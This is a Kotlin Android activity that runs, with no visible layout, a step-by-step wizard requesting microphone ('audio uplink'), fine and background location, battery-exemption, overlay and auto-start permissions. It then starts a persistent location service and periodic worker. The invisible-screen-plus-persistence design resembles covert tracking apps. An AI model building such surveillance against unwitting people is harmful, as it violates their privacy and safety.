package com.example.livelocationservice

import android.Manifest
import android.app.AlarmManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

/**
 * MainActivity handles a sequential permission and settings "wizard".
 * It checks each requirement and only proceeds to the next if the current one is satisfied.
 * If a requirement needs a system Settings screen, it launches it and waits for the user to return (onResume).
 */
class MainActivity : ComponentActivity() {

    private val notificationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        // Result will trigger onResume which calls runFlowStep()
    }

    private val fgLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        // Result will trigger onResume
    }

    private val bgLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        // Result will trigger onResume
    }

    private val micLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        // Result will trigger onResume
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No layout, translucent theme
    }

    override fun onResume() {
        super.onResume()
        runFlowStep()
    }

    private fun runFlowStep() {
        // Step 1: Notifications (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                notificationLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                return
            }
        }

        // Step 2: Microphone for audio uplink
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            micLauncher.launch(Manifest.permission.RECORD_AUDIO)
            return
        }

        // Step 3: Foreground Location
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            fgLocationLauncher.launch(arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ))
            return
        }

        // Step 4: Background Location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                return
            }
        }

        // Step 5: Battery Optimization Exemption
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
                return // Wait for user to return
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        // Step 5: Exact Alarms (Android 12+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = getSystemService(AlarmManager::class.java)
            if (!alarmManager.canScheduleExactAlarms()) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                    return // Wait for user to return
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }

        // Step 6: System Alert Window (Overlay)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
                return // Wait for user to return
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        // Step 7: Vendor Auto-start (Xiaomi, Oppo, etc.)
        // We can't easily check if this is "granted", so we only try once per session or just once.
        // For simplicity, we use a static flag to avoid an infinite loop if the user doesn't enable it.
        if (!oemCheckDone) {
            oemCheckDone = true
            if (OemHelper.openAutoStartManager(this)) {
                return // Wait for user to return
            }
        }

        // Finalize
        startBackgroundServices()
    }

    private fun startBackgroundServices() {
        try {
            val serviceIntent = Intent(this, LiveLocationService::class.java)
            ContextCompat.startForegroundService(this, serviceIntent)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            val workRequest = PeriodicWorkRequestBuilder<LocationWorker>(15, TimeUnit.MINUTES).build()
            WorkManager.getInstance(this).enqueue(workRequest)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        finish()
    }

    companion object {
        private var oemCheckDone = false
    }
}
